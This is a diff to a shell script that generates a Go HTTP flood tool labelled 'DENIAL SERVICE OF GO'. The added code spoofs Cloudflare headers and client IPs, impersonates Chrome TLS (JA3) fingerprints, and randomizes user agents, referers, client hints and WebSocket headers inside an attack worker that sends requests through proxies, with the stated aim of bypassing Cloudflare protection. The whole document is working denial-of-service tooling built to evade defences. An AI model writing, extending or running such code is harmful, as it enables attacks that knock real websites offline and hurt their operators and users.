@@ -23,8 +23,8 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (CLEAN version - no unused imports)
-echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
+# Create main.go file directly (FIXED version with Cloudflare bypass)
+echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with Cloudflare bypass...${NC}"
 
 cat > main.go << 'EOF'
 package main
@@ -32,6 +32,8 @@ package main
 import (
 	"crypto/rand"
 	"crypto/tls"
+	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"math/big"
@@ -273,6 +275,56 @@ var (
 		{"X-API-Key": ""},
 	}
 
+	// Cloudflare-specific bypass headers
+	cloudflareBypassHeaders = []map[string]string{
+		{"CF-Access-Client-Id": ""},
+		{"CF-Access-Client-Secret": ""},
+		{"CF-Authorization": ""},
+		{"CF-Ray": ""},
+		{"CF-WARP-Tag": ""},
+		{"CF-Connecting-IP": ""},
+		{"CF-IPCountry": ""},
+		{"CF-Visitor": "{\"scheme\":\"https\"}"},
+		{"CF-Challenge": ""},
+		{"CF-Cache-Status": ""},
+	}
+
+	// Additional sophisticated headers for Cloudflare
+	sophisticatedHeaders = []map[string]string{
+		{"Accept-CH": "Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-FullVersion,Sec-CH-UA-Model,Sec-CH-UA-Mobile,Sec-CH-UA-Platform,Sec-CH-UA-PlatformVersion"},
+		{"Accept-CH-Lifetime": "86400"},
+		{"Critical-CH": "Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-FullVersion,Sec-CH-UA-Model,Sec-CH-UA-Mobile,Sec-CH-UA-Platform,Sec-CH-UA-PlatformVersion"},
+		{"Sec-CH-UA": `"Google Chrome";v="141", "Chromium";v="141", "Not?A_Brand";v="99"`},
+		{"Sec-CH-UA-Arch": `"x86"`},
+		{"Sec-CH-UA-Bitness": `"64"`},
+		{"Sec-CH-UA-Full-Version": `"141.0.7390.0"`},
+		{"Sec-CH-UA-Full-Version-List": `"Google Chrome";v="141.0.7390.0", "Chromium";v="141.0.7390.0", "Not?A_Brand";v="99.0.0.0"`},
+		{"Sec-CH-UA-Mobile": "?0"},
+		{"Sec-CH-UA-Model": `""`},
+		{"Sec-CH-UA-Platform": `"Windows"`},
+		{"Sec-CH-UA-Platform-Version": `"15.0.0"`},
+		{"Sec-CH-UA-WoW64": "?0"},
+		{"Sec-GPC": "1"},
+		{"SourceMap": "https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/react.js.map"},
+		{"Accept-Push-Policy": "no-push"},
+		{"Accept-Signature": "sig1"},
+		{"P3P": "CP=\"This is not a P3P policy!\""},
+		{"X-Content-Security-Policy": "default-src 'self'"},
+		{"X-Download-Options": "noopen"},
+		{"X-Permitted-Cross-Domain-Policies": "none"},
+		{"X-Robots-Tag": "noindex, nofollow"},
+		{"X-UA-Compatible": "IE=edge"},
+	}
+
+	// WebSocket and upgrade headers
+	websocketHeaders = []map[string]string{
+		{"Upgrade": "websocket"},
+		{"Connection": "Upgrade"},
+		{"Sec-WebSocket-Key": ""},
+		{"Sec-WebSocket-Version": "13"},
+		{"Sec-WebSocket-Extensions": "permessage-deflate"},
+	}
+
 	proxies         []string
 	proxyMu         sync.RWMutex
 	proxyIndex      uint64
@@ -358,6 +410,25 @@ var ja3Signatures = []JA3Signature{
 		MinVersion:       tls.VersionTLS12,
 		MaxVersion:       tls.VersionTLS13,
 	},
+	{
+		Name: "Chrome Windows 141 (Advanced)",
+		CipherSuites: []uint16{
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
+		},
+		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
+		NextProtos:       []string{"h2", "http/1.1", "h3"},
+		MinVersion:       tls.VersionTLS10,
+		MaxVersion:       tls.VersionTLS13,
+	},
 }
 
 type ConnectionPool struct {
@@ -373,17 +444,25 @@ func getRandomJA3Signature() JA3Signature {
 	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
 }
 
-func getRandomizedTLSConfig() *tls.Config {
+func getAdvancedTLSConfig() *tls.Config {
 	sig := getRandomJA3Signature()
+	
+	alpnProtos := []string{"h2", "http/1.1", "h3"}
+	sessionTicketsDisabled := randBool()
+	clientSessionCache := tls.NewLRUClientSessionCache(randInt(10, 50))
+	
 	return &tls.Config{
-		NextProtos:                  sig.NextProtos,
+		NextProtos:                  alpnProtos,
 		InsecureSkipVerify:          true,
 		MinVersion:                  sig.MinVersion,
 		MaxVersion:                  sig.MaxVersion,
 		CipherSuites:                sig.CipherSuites,
 		CurvePreferences:            sig.CurvePreferences,
-		SessionTicketsDisabled:      randBool(),
+		SessionTicketsDisabled:      sessionTicketsDisabled,
 		DynamicRecordSizingDisabled: randBool(),
+		ClientSessionCache:          clientSessionCache,
+		Rand:                        rand.Reader,
+		Time:                        time.Now,
 	}
 }
 
@@ -413,7 +492,7 @@ func (p *ConnectionPool) createClient() *http.Client {
 			if err == nil {
 				transport = &http.Transport{
 					Proxy:               http.ProxyURL(proxyURL),
-					TLSClientConfig:     getRandomizedTLSConfig(),
+					TLSClientConfig:     getAdvancedTLSConfig(),
 					MaxIdleConns:        100,
 					MaxIdleConnsPerHost: 100,
 					IdleConnTimeout:     120 * time.Second,
@@ -427,7 +506,7 @@ func (p *ConnectionPool) createClient() *http.Client {
 	}
 
 	transport = &http.Transport{
-		TLSClientConfig:     getRandomizedTLSConfig(),
+		TLSClientConfig:     getAdvancedTLSConfig(),
 		MaxIdleConns:        100,
 		MaxIdleConnsPerHost: 100,
 		IdleConnTimeout:     120 * time.Second,
@@ -531,49 +610,10 @@ func randomCountryCode() string {
 	return countryCodes[randInt(0, len(countryCodes)-1)]
 }
 
-func randomReferer() string {
-	// Generate random legitimate-looking URL
-	schemes := []string{"https", "http"}
-	scheme := schemes[randInt(0, len(schemes)-1)]
-	
-	domains := []string{
-		"google.com", "bing.com", "duckduckgo.com", "youtube.com", "facebook.com",
-		"twitter.com", "instagram.com", "linkedin.com", "wikipedia.org", "reddit.com",
-		"amazon.com", "ebay.com", "netflix.com", "spotify.com", "github.com",
-		"stackoverflow.com", "medium.com", "quora.com", "tumblr.com", "pinterest.com",
-		"whatsapp.com", "telegram.org", "zoom.us", "microsoft.com", "apple.com",
-	}
-	domain := domains[randInt(0, len(domains)-1)]
-	
-	tlds := []string{"com", "org", "net", "io", "co", "uk", "de", "fr", "jp", "br"}
-	tld := tlds[randInt(0, len(tlds)-1)]
-	
-	paths := []string{
-		"/", "/search", "/results", "/page", "/home", "/explore", "/trending",
-		"/popular", "/news", "/blog", "/post", "/article", "/watch", "/feed", 
-		"/about", "/discover", "/top", "/latest", "/random", "/featured", "/viral",
-	}
-	path := paths[randInt(0, len(paths)-1)]
-	
-	// Add random query parameters 70% of the time
-	if randInt(1, 100) <= 70 {
-		path += "?q=" + randomString(randInt(3, 10))
-		if randBool() {
-			path += "&" + randomString(randInt(3, 8)) + "=" + randomString(randInt(2, 12))
-		}
-		if randBool() {
-			path += "&utm_source=google&utm_medium=organic&utm_campaign=" + randomString(randInt(5, 15))
-		}
-	}
-	
-	return fmt.Sprintf("%s://%s.%s%s", scheme, domain, tld, path)
-}
-
 func generateRandomUA() string {
 	browserType := randInt(1, 100)
 	countryCode := randomCountryCode()
 	
-	// Windows versions (2025-2026)
 	windowsVersions := []string{
 		"Windows NT 10.0; Win64; x64",
 		"Windows NT 11.0; Win64; x64",
@@ -581,7 +621,6 @@ func generateRandomUA() string {
 		"Windows NT 10.0; Win64; x64; Xbox",
 	}
 	
-	// macOS versions (2025-2026)
 	macVersions := []string{
 		"Macintosh; Intel Mac OS X 15_0",
 		"Macintosh; Intel Mac OS X 15_1",
@@ -592,7 +631,6 @@ func generateRandomUA() string {
 		"Macintosh; ARM Mac OS X 16_0",
 	}
 	
-	// Linux distributions
 	linuxVersions := []string{
 		"X11; Linux x86_64",
 		"X11; Ubuntu; Linux x86_64",
@@ -601,33 +639,29 @@ func generateRandomUA() string {
 		"X11; Linux x86_64; Arch",
 	}
 	
-	// Chrome versions (2025-2026)
 	chromeMajor := randInt(141, 165)
 	chromeBuild := randInt(5000, 8000)
 	chromePatch := randInt(0, 99)
 	chromeVersion := fmt.Sprintf("%d.0.%d.%d", chromeMajor, chromeBuild, chromePatch)
 	
-	// Firefox versions (2025-2026)
 	firefoxMajor := randInt(135, 165)
 	firefoxMinor := randInt(0, 9)
-	firefoxVersion := fmt.Sprintf("%d.%d", firefoxMajor, firefoxMinor)
+	firefoxPatch := randInt(0, 99)
+	firefoxVersion := fmt.Sprintf("%d.%d.%d", firefoxMajor, firefoxMinor, firefoxPatch)
 	
-	// Edge versions (2025-2026)
 	edgeMajor := randInt(141, 165)
 	edgeBuild := randInt(5000, 8000)
 	edgePatch := randInt(0, 99)
 	edgeVersion := fmt.Sprintf("%d.0.%d.%d", edgeMajor, edgeBuild, edgePatch)
 	
-	// Safari versions (2025-2026)
 	safariMajor := randInt(18, 22)
 	safariMinor := randInt(0, 5)
 	safariVersion := fmt.Sprintf("%d.%d", safariMajor, safariMinor)
 	
-	// Mobile browsers
 	androidVersions := []string{"15", "16", "17"}
 	androidVersion := androidVersions[randInt(0, len(androidVersions)-1)]
 	
-	if browserType <= 45 { // Chrome 45%
+	if browserType <= 45 {
 		osType := randInt(1, 100)
 		var os string
 		if osType <= 40 {
@@ -638,7 +672,7 @@ func generateRandomUA() string {
 			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
 		}
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, countryCode, chromeVersion)
-	} else if browserType <= 75 { // Firefox 30%
+	} else if browserType <= 75 {
 		osType := randInt(1, 100)
 		var os string
 		if osType <= 40 {
@@ -649,26 +683,55 @@ func generateRandomUA() string {
 			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
 		}
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s", os, countryCode, firefoxVersion, firefoxVersion)
-	} else if browserType <= 88 { // Edge 13%
+	} else if browserType <= 88 {
 		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, countryCode, edgeVersion, edgeVersion)
-	} else if browserType <= 95 { // Safari 7%
+	} else if browserType <= 95 {
 		os := macVersions[randInt(0, len(macVersions)-1)]
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, countryCode, safariVersion)
-	} else { // Mobile browsers 5%
+	} else {
 		mobileType := randInt(1, 100)
-		if mobileType <= 60 { // Android Chrome
+		if mobileType <= 60 {
 			device := []string{"SM-G998B", "Pixel 9 Pro", "OnePlus 12", "Xiaomi 14", "SM-S938B"}[randInt(0, 4)]
 			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36", androidVersion, countryCode, device, chromeVersion)
-		} else if mobileType <= 85 { // iPhone Safari
+		} else if mobileType <= 85 {
 			iphoneModel := []string{"iPhone18,1", "iPhone18,2", "iPhone18,3"}[randInt(0, 2)]
 			iosVersion := []string{"18_0", "18_1", "18_2", "19_0"}[randInt(0, 3)]
 			return fmt.Sprintf("Mozilla/5.0 (%s; %s; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", iphoneModel, countryCode, iosVersion, safariVersion)
-		} else { // Samsung Internet
+		} else {
 			samsungVersion := fmt.Sprintf("%d.0", randInt(25, 30))
 			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/%s Chrome/%s Mobile", androidVersion, countryCode, samsungVersion, chromeVersion)
 		}
 	}
+}
+
+func randomReferer() string {
+	domains := []string{
+		"google.com", "bing.com", "duckduckgo.com", "facebook.com", "reddit.com",
+		"youtube.com", "twitter.com", "linkedin.com", "instagram.com", "tiktok.com",
+		"wikipedia.org", "amazon.com", "netflix.com", "spotify.com", "yahoo.com",
+		"github.com", "stackoverflow.com", "quora.com", "medium.com", "pinterest.com",
+	}
+	
+	paths := []string{
+		"/", "/search", "/results", "/page", "/home", "/explore", "/trending",
+		"/popular", "/news", "/blog", "/post", "/article", "/watch", "/feed", "/about", "/#",
+		"/discover", "/top", "/latest", "/random", "/featured", "/viral",
+	}
+	
+	protocols := []string{"https", "http"}
+	protocol := protocols[randInt(0, len(protocols)-1)]
+	domain := domains[randInt(0, len(domains)-1)]
+	path := paths[randInt(0, len(paths)-1)]
+	
+	if randInt(1, 100) <= 70 {
+		path += "?q=" + randomString(randInt(3, 10))
+		if randBool() {
+			path += "&" + randomString(randInt(3, 8)) + "=" + randomString(randInt(2, 12))
+		}
+	}
+	
+	return fmt.Sprintf("%s://%s%s", protocol, domain, path)
 }
 
 func randomString(n int) string {
@@ -730,6 +793,113 @@ func generateCookies() string {
 		return ""
 	}
 	return strings.Join(cookies, "; ")
+}
+
+func generateWebSocketKey() string {
+	key := make([]byte, 16)
+	rand.Read(key)
+	return base64.StdEncoding.EncodeToString(key)
+}
+
+func generateCFRay() string {
+	timestamp := time.Now().Unix()
+	random := randInt(100000, 999999)
+	return fmt.Sprintf("%d-%d-x", timestamp, random)
+}
+
+func generateCFChallenge() string {
+	challenge := make([]byte, 32)
+	rand.Read(challenge)
+	return hex.EncodeToString(challenge)
+}
+
+func generateAltSvcHeader() string {
+	altSvcs := []string{
+		"h3=\":443\"; ma=86400",
+		"h3=\":443\"; ma=86400, h3-29=\":443\"; ma=86400",
+		"h2=\":443\"; ma=86400",
+	}
+	return altSvcs[randInt(0, len(altSvcs)-1)]
+}
+
+func generateCacheControlExtended() string {
+	controls := []string{
+		"max-age=0, no-cache, no-store, must-revalidate",
+		"private, no-cache, no-store, max-age=0",
+		"public, max-age=31536000, immutable",
+		"no-cache, no-store, private",
+		"must-revalidate, max-age=0",
+	}
+	return controls[randInt(0, len(controls)-1)]
+}
+
+func generateContentSecurityPolicy() string {
+	policies := []string{
+		"default-src 'self'",
+		"default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval'",
+		"default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'",
+		"upgrade-insecure-requests",
+	}
+	return policies[randInt(0, len(policies)-1)]
+}
+
+func generateFeaturePolicy() string {
+	policies := []string{
+		"camera 'none'; microphone 'none'; geolocation 'none'",
+		"fullscreen 'self'",
+		"payment 'none'",
+	}
+	return policies[randInt(0, len(policies)-1)]
+}
+
+func generateRequestID() string {
+	id := make([]byte, 16)
+	rand.Read(id)
+	return hex.EncodeToString(id)
+}
+
+func generateCloudflareHeaders(req *http.Request) {
+	if randInt(1, 100) <= 40 {
+		cfHeader := cloudflareBypassHeaders[randInt(0, len(cloudflareBypassHeaders)-1)]
+		for k, v := range cfHeader {
+			if v == "" {
+				switch k {
+				case "CF-Access-Client-Id":
+					req.Header.Set(k, randomString(32))
+				case "CF-Access-Client-Secret":
+					req.Header.Set(k, randomString(64))
+				case "CF-Authorization":
+					req.Header.Set(k, "Bearer "+randomString(40))
+				case "CF-Ray":
+					req.Header.Set(k, generateCFRay())
+				case "CF-WARP-Tag":
+					req.Header.Set(k, randomString(20))
+				case "CF-Connecting-IP":
+					req.Header.Set(k, randomIP())
+				case "CF-IPCountry":
+					req.Header.Set(k, randomCountryCode())
+				case "CF-Challenge":
+					req.Header.Set(k, generateCFChallenge())
+				default:
+					req.Header.Set(k, randomString(16))
+				}
+			} else {
+				req.Header.Set(k, v)
+			}
+		}
+	}
+	
+	if randInt(1, 100) <= 60 {
+		sophHeader := sophisticatedHeaders[randInt(0, len(sophisticatedHeaders)-1)]
+		for k, v := range sophHeader {
+			req.Header.Set(k, v)
+		}
+	}
+
+	if randInt(1, 100) <= 25 {
+		req.Header.Set("X-Request-Start", fmt.Sprintf("%d", time.Now().UnixNano()/1000000))
+		req.Header.Set("X-Request-ID", generateRequestID())
+	}
 }
 
 func main() {
@@ -969,6 +1139,56 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				if cookies != "" {
 					req.Header.Set("Cookie", cookies)
 				}
+			}
+
+			// Add Cloudflare bypass headers
+			generateCloudflareHeaders(req)
+
+			// Add randomized WebSocket upgrade headers occasionally
+			if randInt(1, 100) <= 15 {
+				wsHeader := websocketHeaders[randInt(0, len(websocketHeaders)-1)]
+				for k, v := range wsHeader {
+					if v == "" {
+						if k == "Sec-WebSocket-Key" {
+							req.Header.Set(k, generateWebSocketKey())
+						} else {
+							req.Header.Set(k, randomString(16))
+						}
+					} else {
+						req.Header.Set(k, v)
+					}
+				}
+			}
+
+			// Add Alt-Svc header for HTTP/3 hinting
+			if randInt(1, 100) <= 20 {
+				req.Header.Set("Alt-Svc", generateAltSvcHeader())
+			}
+
+			// Add enhanced cache control
+			if randInt(1, 100) <= 40 {
+				req.Header.Set("Cache-Control", generateCacheControlExtended())
+			}
+
+			// Add security policy headers
+			if randInt(1, 100) <= 25 {
+				req.Header.Set("Content-Security-Policy", generateContentSecurityPolicy())
+				req.Header.Set("Feature-Policy", generateFeaturePolicy())
+			}
+
+			// Add priority headers
+			if randInt(1, 100) <= 30 {
+				req.Header.Set("Priority", "u=0, i")
+				req.Header.Set("Sec-Fetch-User", "?1")
+			}
+
+			// Add viewport and device information
+			if randInt(1, 100) <= 20 {
+				req.Header.Set("Viewport-Width", strconv.Itoa(randInt(320, 3840)))
+				req.Header.Set("Device-Memory", strconv.Itoa(randInt(2, 8)))
+				req.Header.Set("RTT", strconv.Itoa(randInt(50, 300)))
+				req.Header.Set("Downlink", fmt.Sprintf("%.1f", float64(randInt(1, 100))/10))
+				req.Header.Set("ECT", []string{"4g", "3g", "2g", "slow-2g"}[randInt(0, 3)])
 			}
 
 			resp, err := client.Do(req)
